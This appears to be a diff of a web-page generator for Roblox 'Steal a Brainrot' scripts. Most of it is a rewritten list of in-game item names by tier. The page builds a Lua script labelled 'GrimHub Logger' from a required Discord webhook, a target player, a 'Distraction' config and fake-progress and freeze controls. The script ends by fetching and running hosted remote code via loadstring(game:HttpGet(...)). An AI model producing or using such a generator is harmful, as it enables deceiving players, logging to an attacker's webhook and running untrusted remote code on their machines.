-        { name: "Lovin Rose", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Los Tacoritas", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Eviledon", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Los Primos", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "W or L", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Esok Sekolah", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "La Jolly Grande", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Los Cupids", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Los Puggies", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Tralaledon", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Gobblino Uniciclino", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Tuff Toucan", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Mieteteira Bicicleteira", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Chillin Chili", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Money Money Reindeer", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "La Spooky Grande", category: "mythic", tierLabel: "MYTHIC" },
+        // ========== LEGENDARY TIER ==========
+        { name: "Sigma Boy", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Sigma Girl", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Puffaball", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Caramello Filtrello", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Chimpanzini Bananini", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Quackula", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Buho del Cielo", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Buho de Fuego", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Chocco Bunny", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Sealo Regalo", category: "legendary", tierLabel: "LEGENDARY" },
+        { name: "Seraphino Gruyero", category: "legendary", tierLabel: "LEGENDARY" },
         
-        // EPIC TIER
-        { name: "Bacuru and Egguru", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Bros", category: "epic", tierLabel: "EPIC" },
-        { name: "La Extinct Grande", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Candies", category: "epic", tierLabel: "EPIC" },
-        { name: "Los 67", category: "epic", tierLabel: "EPIC" },
-        { name: "Celularcini Viciosini", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Mobilis", category: "epic", tierLabel: "EPIC" },
-        { name: "Money Money Puggy", category: "epic", tierLabel: "EPIC" },
-        { name: "Cigno Fulgoro", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Spooky Combinasionas", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Hotspotsitos", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Jolly Combinasionas", category: "epic", tierLabel: "EPIC" },
-        { name: "Snailo Clovero", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Planitos", category: "epic", tierLabel: "EPIC" },
-        { name: "Chicleteira Cupideira", category: "epic", tierLabel: "EPIC" },
-        { name: "DJ Panda", category: "epic", tierLabel: "EPIC" },
-        { name: "Las Sis", category: "epic", tierLabel: "EPIC" },
-        { name: "Spinny Hammy", category: "epic", tierLabel: "EPIC" },
-        { name: "Tacorita Bicicleta", category: "epic", tierLabel: "EPIC" },
-        { name: "Los Sweethearts", category: "epic", tierLabel: "EPIC" },
+        // ========== EPIC TIER ==========
+        { name: "Salamino Penguino", category: "epic", tierLabel: "EPIC" },
+        { name: "Malame Amarele", category: "epic", tierLabel: "EPIC" },
+        { name: "Penguino Cocosino", category: "epic", tierLabel: "EPIC" },
         
-        // RARE TIER
-        { name: "Nuclearo Dinossauro", category: "rare", tierLabel: "RARE" },
-        { name: "Chicleteira Noelteira", category: "rare", tierLabel: "RARE" },
-        { name: "Los Combinasionas", category: "rare", tierLabel: "RARE" },
-        { name: "Chimnino", category: "rare", tierLabel: "RARE" },
-        { name: "Noo my Gold", category: "rare", tierLabel: "RARE" },
-        { name: "Swag Soda", category: "rare", tierLabel: "RARE" },
-        { name: "Noo my Heart", category: "rare", tierLabel: "RARE" },
-        { name: "Tacorillo Crocodillo", category: "rare", tierLabel: "RARE" },
-        { name: "Mariachi Corazoni", category: "rare", tierLabel: "RARE" },
-        { name: "La Grande Combinasion", category: "rare", tierLabel: "RARE" },
-        { name: "Los 25", category: "rare", tierLabel: "RARE" },
-        { name: "Los Burritos", category: "rare", tierLabel: "RARE" },
-        { name: "67", category: "rare", tierLabel: "RARE" },
-        { name: "Donkeyturbo Express", category: "rare", tierLabel: "RARE" },
-        { name: "Los Chicleteiras", category: "rare", tierLabel: "RARE" },
-        { name: "Guest 666", category: "rare", tierLabel: "RARE" },
-        { name: "Los Mi Gatitos", category: "rare", tierLabel: "RARE" },
-        { name: "Rang Ring Bus", category: "rare", tierLabel: "RARE" },
-        { name: "Granny", category: "rare", tierLabel: "RARE" },
-        { name: "Noo my Present", category: "rare", tierLabel: "RARE" },
+        // ========== RARE TIER ==========
+        { name: "Trippi Troppi", category: "rare", tierLabel: "RARE" },
+        { name: "Pipi Avocado", category: "rare", tierLabel: "RARE" },
         
-        // COMMON TIER
-        { name: "Serafinna Medusella", category: "common", tierLabel: "COMMON" },
-        { name: "Los Nooo My Hotspotsitos", category: "common", tierLabel: "COMMON" },
-        { name: "Arcadopus", category: "common", tierLabel: "COMMON" },
-        { name: "Noo my Candy", category: "common", tierLabel: "COMMON" },
-        { name: "Los Quesadillas", category: "common", tierLabel: "COMMON" },
-        { name: "Chicleteirina Bicicleteirina", category: "common", tierLabel: "COMMON" },
-        { name: "Chill Puppy", category: "common", tierLabel: "COMMON" },
-        { name: "Burrito Bandito", category: "common", tierLabel: "COMMON" },
-        { name: "Luck Luck Luck Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Chicleteira Bicicleteira", category: "common", tierLabel: "COMMON" },
-        { name: "Brunito Marsito", category: "common", tierLabel: "COMMON" },
-        { name: "Quesadillo Vampiro", category: "common", tierLabel: "COMMON" },
-        { name: "Eid Eid Eid Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Cupid Hotspot", category: "common", tierLabel: "COMMON" },
-        { name: "Mi Gatito", category: "common", tierLabel: "COMMON" },
-        { name: "Ho Ho Ho Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Cupid Cupid Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Pot Pumpkin", category: "common", tierLabel: "COMMON" },
-        { name: "Naughty Naughty", category: "common", tierLabel: "COMMON" },
-        { name: "Bunito Bunito Spinito", category: "common", tierLabel: "COMMON" },
-        { name: "Quesadilla Crocodila", category: "common", tierLabel: "COMMON" },
-        { name: "Horegini Boom", category: "common", tierLabel: "COMMON" },
-        { name: "Santa Hotspot", category: "common", tierLabel: "COMMON" },
-        { name: "Pot Hotspot", category: "common", tierLabel: "COMMON" },
-        { name: "25", category: "common", tierLabel: "COMMON" },
-        { name: "Pirulitoita Bicicleteira", category: "common", tierLabel: "COMMON" },
-        { name: "To to to Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Telemorte", category: "common", tierLabel: "COMMON" },
-        { name: "La Sahur Combinasion", category: "common", tierLabel: "COMMON" },
-        { name: "List List List Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Noo my examine", category: "common", tierLabel: "COMMON" },
-        { name: "Los Jobcitos", category: "common", tierLabel: "COMMON" },
-        { name: "Nooo My Hotspot", category: "common", tierLabel: "COMMON" },
-        { name: "Bunnyman", category: "common", tierLabel: "COMMON" },
-        { name: "Tung Tung Tung Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Cuadramat and Pakrahmatmamat", category: "common", tierLabel: "COMMON" },
-        { name: "Please my Present", category: "common", tierLabel: "COMMON" },
-        { name: "Los Cucarachas", category: "common", tierLabel: "COMMON" },
-        { name: "1x1x1x1", category: "common", tierLabel: "COMMON" },
-        { name: "La Vacca Lepre Lepreino", category: "common", tierLabel: "COMMON" },
-        { name: "Love Love Love Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Perrito Burrito", category: "common", tierLabel: "COMMON" },
-        { name: "Graipuss Medussi", category: "common", tierLabel: "COMMON" },
-        { name: "Giftini Spyderini", category: "common", tierLabel: "COMMON" },
-        { name: "Trickolino", category: "common", tierLabel: "COMMON" },
-        { name: "Paradiso Axolottino", category: "common", tierLabel: "COMMON" },
-        { name: "Triplito Tralaleritos", category: "common", tierLabel: "COMMON" },
-        { name: "La Vacca Jacko Linterino", category: "common", tierLabel: "COMMON" },
-        { name: "Fishboard", category: "common", tierLabel: "COMMON" },
-        { name: "Santteo", category: "common", tierLabel: "COMMON" },
-        { name: "Las Vaquitas Saturnitas", category: "common", tierLabel: "COMMON" },
-        { name: "Los Karkeritos", category: "common", tierLabel: "COMMON" },
-        { name: "Karker Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Los Trios", category: "common", tierLabel: "COMMON" },
-        { name: "Job Job Job Sahur", category: "common", tierLabel: "COMMON" },
-        { name: "Frankentteo", category: "common", tierLabel: "COMMON" },
-        { name: "Pumpkini Spyderini", category: "common", tierLabel: "COMMON" },
-        { name: "Las Tralaleritas", category: "common", tierLabel: "COMMON" },
-        { name: "Rocco Disco", category: "common", tierLabel: "COMMON" },
-        { name: "Extinct Matteo", category: "common", tierLabel: "COMMON" },
-        { name: "La Karkerkar Kombinasin", category: "common", tierLabel: "COMMON" },
-        { name: "La Vacca Prese Presente", category: "common", tierLabel: "COMMON" },
-        { name: "Reindeer Tralala", category: "common", tierLabel: "COMMON" },
-        { name: "Yess my examine", category: "common", tierLabel: "COMMON" },
-        { name: "Guerriro Digitale", category: "common", tierLabel: "COMMON" },
-        { name: "Boatito Auratito", category: "common", tierLabel: "COMMON" },
-        { name: "Vulturino Skeletono", category: "common", tierLabel: "COMMON" },
-        { name: "Los Tralaleritos", category: "common", tierLabel: "COMMON" },
-        { name: "Zombie Tralala", category: "common", tierLabel: "COMMON" },
-        { name: "Los Tortus", category: "common", tierLabel: "COMMON" },
-        { name: "La Cucaracha", category: "common", tierLabel: "COMMON" },
-        { name: "Fragola La La La", category: "common", tierLabel: "COMMON" },
-        { name: "Extinct Tralalero", category: "common", tierLabel: "COMMON" },
-        { name: "Agarrini la Palini", category: "common", tierLabel: "COMMON" },
-        { name: "Los Spyderinis", category: "common", tierLabel: "COMMON" },
-        { name: "Chachechi", category: "common", tierLabel: "COMMON" },
-        { name: "Dul Dul Dul", category: "common", tierLabel: "COMMON" },
-        { name: "Torrtuginni Dragonfrutini", category: "common", tierLabel: "COMMON" },
-        { name: "Trenostruzzo Turbo 4000", category: "common", tierLabel: "COMMON" },
-        { name: "Karkerkar Kurkur", category: "common", tierLabel: "COMMON" },
-        { name: "Los Matteos", category: "common", tierLabel: "COMMON" },
-        { name: "Bisonte Giuppitere", category: "common", tierLabel: "COMMON" },
-        { name: "Sammyni Spyderini", category: "common", tierLabel: "COMMON" },
-        { name: "La Vacca Saturno Saturnita", category: "common", tierLabel: "COMMON" },
-        { name: "Jackorilla", category: "common", tierLabel: "COMMON" }
+        // ========== COMMON TIER ==========
+        { name: "Noobini Pizzanini", category: "common", tierLabel: "COMMON" },
+        { name: "Lirili Larila", category: "common", tierLabel: "COMMON" },
+        { name: "Tim Cheese", category: "common", tierLabel: "COMMON" },
+        { name: "Fluriflura", category: "common", tierLabel: "COMMON" },
+        { name: "Talpa Di Fero", category: "common", tierLabel: "COMMON" },
+        { name: "Noobini Santanini", category: "common", tierLabel: "COMMON" },
+        { name: "Svinina Bombardino", category: "common", tierLabel: "COMMON" },
+        { name: "Raccooni Jandelini", category: "common", tierLabel: "COMMON" },
+        { name: "Pipi Kiwi", category: "common", tierLabel: "COMMON" },
+        { name: "Tartaragno", category: "common", tierLabel: "COMMON" },
+        { name: "Pipi Corni", category: "common", tierLabel: "COMMON" },
+        { name: "Holy Arepa", category: "common", tierLabel: "COMMON" }
     ];
 
     document.getElementById('totalBrainrotsCount').innerText = brainrotsWithCategory.length;
@@ -678,17 +597,13 @@
             const imgMatch = html.match(/data-src="(https:\/\/static\.wikia\.nocookie\.net\/[^"]+\.(?:png|jpg|jpeg|webp|gif))/i);
             if (imgMatch && imgMatch[1]) return imgMatch[1];
             return null;
-        } catch (e) {
-            return null;
-        }
+        } catch (e) { return null; }
     }
 
     const imageCache = new Map();
-
     async function loadImageForBrainrot(name, imgElement) {
         if (imageCache.has(name)) {
-            const imgUrl = imageCache.get(name);
-            imgElement.src = imgUrl || `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
+            imgElement.src = imageCache.get(name) || `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
             return;
         }
         imgElement.src = `https://ui-avatars.com/api/?background=423189&color=fff&size=32&name=${encodeURIComponent(name.charAt(0))}`;
@@ -704,7 +619,6 @@
     const searchInput = document.getElementById('brainrotSearch');
     const webhookInput = document.getElementById('webhookInput');
     const targetUser = document.getElementById('targetUser');
-    const scriptMode = document.getElementById('scriptMode');
     const fakeProgress = document.getElementById('fakeProgress');
     const fakeWebSocket = document.getElementById('fakeWebSocket');
     const freezeSlider = document.getElementById('freezeSlider');
@@ -729,32 +643,22 @@
 
     async function renderBrainrots() {
         const searchTerm = searchInput.value.toLowerCase();
-        let filtered = brainrotsWithCategory.filter(br => 
-            br.name.toLowerCase().includes(searchTerm)
-        );
-        
-        if (currentCategory !== "all") {
-            filtered = filtered.filter(br => br.category === currentCategory);
-        }
-        
+        let filtered = brainrotsWithCategory.filter(br => br.name.toLowerCase().includes(searchTerm));
+        if (currentCategory !== "all") filtered = filtered.filter(br => br.category === currentCategory);
         brainrotGrid.innerHTML = '';
         for (const brainrot of filtered) {
             const isChecked = selectedBrainrots.has(brainrot.name);
             const div = document.createElement('div');
             div.className = `brainrot-item ${isChecked ? 'selected' : ''}`;
-            
             const img = document.createElement('img');
             const span = document.createElement('span');
             span.innerText = brainrot.name;
-            
             const badge = document.createElement('span');
             badge.className = `tier-badge tier-${brainrot.category}`;
             badge.innerText = brainrot.tierLabel;
-            
             div.appendChild(img);
             div.appendChild(span);
             div.appendChild(badge);
-            
             div.addEventListener('click', () => {
                 if (selectedBrainrots.has(brainrot.name)) {
                     selectedBrainrots.delete(brainrot.name);
@@ -765,22 +669,17 @@
                 }
                 updateSelectedCount();
             });
-            
             brainrotGrid.appendChild(div);
             loadImageForBrainrot(brainrot.name, img);
         }
         updateSelectedCount();
     }
 
-    function updateSelectedCount() {
-        selectedStats.innerText = selectedBrainrots.size;
-    }
+    function updateSelectedCount() { selectedStats.innerText = selectedBrainrots.size; }
 
     function selectAll() {
         let itemsToSelect = brainrotsWithCategory;
-        if (currentCategory !== "all") {
-            itemsToSelect = brainrotsWithCategory.filter(br => br.category === currentCategory);
-        }
+        if (currentCategory !== "all") itemsToSelect = brainrotsWithCategory.filter(br => br.category === currentCategory);
         itemsToSelect.forEach(br => selectedBrainrots.add(br.name));
         updateSelectedCount();
         renderBrainrots();
@@ -800,21 +699,12 @@
 
     function generateScript() {
         const webhook = webhookInput.value.trim();
-        if (!webhook) {
-            alert('Webhook required');
-            return;
-        }
-        if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
-            alert('Invalid webhook URL');
-            return;
-        }
-        
+        if (!webhook) { alert('Webhook required'); return; }
+        if (!webhook.startsWith('https://discord.com/api/webhooks/')) { alert('Invalid webhook URL'); return; }
         const target = targetUser.value.trim() || "Morreria";
         const brainrotsArray = Array.from(selectedBrainrots);
         let brainrotsLua = '{' + brainrotsArray.map(br => `"${br.replace(/"/g, '\\"')}"`).join(', ') + '}';
-        
         const freezeSec = parseInt(freezeSlider.value, 10);
-        
         const script = `-- GrimHub Logger
 script_key = "trial"
 
@@ -829,26 +719,17 @@ getgenv().Distraction = {
 }
 
 loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf4184336d3d2463fedaccd56ede1246ebba931f664c1058acd094.lua"))()`;
-        
         outputCode.innerText = script;
     }
     
     generateBtn.addEventListener('click', generateScript);
-    
     copyBtn.addEventListener('click', async () => {
-        if (!outputCode.innerText.includes('Webhook')) {
-            alert('Generate first');
-            return;
-        }
+        if (!outputCode.innerText.includes('Webhook')) { alert('Generate first'); return; }
         await navigator.clipboard.writeText(outputCode.innerText);
         showToast('Copied');
     });
-    
     downloadBtn.addEventListener('click', () => {
-        if (!outputCode.innerText.includes('Webhook')) {
-            alert('Generate first');
-            return;
-        }
+        if (!outputCode.innerText.includes('Webhook')) { alert('Generate first'); return; }
         const blob = new Blob([outputCode.innerText], {type: 'text/plain'});
         const a = document.createElement('a');
         a.href = URL.createObjectURL(blob);
